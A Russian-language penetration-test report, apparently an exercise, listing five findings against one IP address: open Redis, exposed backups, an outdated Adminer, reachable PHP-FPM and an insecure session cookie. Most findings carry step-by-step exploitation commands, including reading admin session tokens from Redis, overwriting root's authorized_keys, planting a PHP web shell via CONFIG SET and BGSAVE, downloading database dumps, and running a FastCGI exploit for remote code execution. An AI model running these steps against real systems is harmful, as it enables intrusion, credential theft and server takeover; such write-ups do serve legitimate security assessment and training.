1. Первое что мне бросилось в глаза после просмотра краткого отчета это Redis без авторизации, по факту она не должна быть открыта наружу да еще и без пароля, но тут мы можем получить данные из этой бд, видно что есть токен сессии админа и конфиг базы данных
Риск: Высокий потому что мы можем украсть активные сессии
Шаги эксплуатации:
Подключаемся к redis 
```
redis-cli -h 2.12.85.6
```
Проверяем список всех сохраненных данных 
```
KEYS *
```
Читаем токен сессии администратора
```
GET "session:admin:9f3a2b"
```
Читаем конфиг базы данных
```
GET "config:database"
```
После получаем данные для подключения к БД или сессию админа
Так же если Redis запущен с правами администратора, мы можем записать свой SSH ключ 
```
redis-cli -h 2.12.85.6 CONFIG SET dir /root/.ssh 
redis-cli -h 2.12.85.6 CONFIG SET dbfilename authorized_keys
redis-cli -h 2.12.85.6 SET pwn "\n\nssh-rsa SSH_KEY\n\n" 
redis-cli -h 2.12.85.6 BGSAVE
```
После чего можем подключиться по SSH ключу, либо если нет доступа, тогда можно попробовать записать шел
```
redis-cli -h 2.12.85.6 CONFIG SET dir /var/www/html 
redis-cli -h 2.12.85.6 CONFIG SET dbfilename shell.php 
redis-cli -h 2.12.85.6 SET pwn "<?php system(\$_GET['cmd']); ?>" 
redis-cli -h 2.12.85.6 BGSAVE
```
после чего переходит по /var/www/html/shell.php и получаем web shell

Далее Information Disclosure при запросе `curl -I http://2.12.85.6/` получаем что в ответе отдается версия nginx/1.18.0 и версия PHP X-Powered-By: PHP/8.1.2, далее указывается что открыт файл robots.txt и там запрещенные ссылки на сайте, /admin это скорее всего админ панель а /backup вообще содержит открытые дампы конфигурации причем они достаточно свежие если задается как год месяц день, то они буквально создались в этот же день, так же можно выкачать конфигурацию сайта, возможно там исходники
Риск: высокий, можем получить дамп базы данных, если там содержатся хеши паролей или сессии мы можем использовать их для дальнейшей атаки
Эксплуатация: 
Скачиваем дамп базы данных и конфигурацию сайта
```
wget http://2.12.85.6/backup/db_dump_2024-01-15.sql.gz  
wget http://2.12.85.6/backup/site_config.tar.gz
```
распаковываем
```
tar -xf db_dump_2024-01-15.sql.gz
tar -xf site_config.tar.gz
```
далее уже ищем пароли, хэши или сессии

Открытый adminer 4.6.1, панель для управления бд, то есть любой у кого есть данные для входа может попасть на внутренний сервис для управления бд, так же я нашел CVE-2021-29625 для этой версии но PoC для нее мне найти не удалось, так же нашел https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6 CVE-2021-21311 в котором показан SSRF через выведение ошибок PoC https://github.com/llhala/CVE-2021-21311
Риск: получение доступа к админскому функционалу при наличии логина пароля(которые возможно будут в дампах), SSRF из за уязвимой версии
Эксплуатация:
Если из дампа удалось получить креды мы указываем их и получаем доступ к MySQL и используем Select .... INTO OUTFILES для записи файлов либо используем SSRF для исследования внутренней инфраструктуры
4. PHP-FPM наружу, в запросе показано что сервер выполнил запрос к php файлу на сервере, но из за того что команды можно прописывать в теле запроса можем получить полноценный RCE
Риск: RCE 
Эксплуатация: 
Используем этот эксплоит https://github.com/wofeiwo/webcgi-exploits 
```
./fcgi_exp -h 2.12.85.6 -p 9000 exec /var/www/html/index.php id
```
после чего в теории получаем RCE
5. Отсутствие флага Secure на PHPSESSID, то есть куки может передаваться по http
Риск: перехват сесии при Mitm
